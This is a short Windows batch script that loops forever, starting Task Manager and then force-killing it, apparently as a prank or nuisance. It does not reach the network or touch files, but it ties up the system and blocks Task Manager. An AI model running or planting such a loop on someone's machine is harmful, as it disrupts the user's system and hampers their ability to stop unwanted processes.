@echo off
:loop
start taskmgr.exe
taskkill /f /im taskmgr.exe
goto loop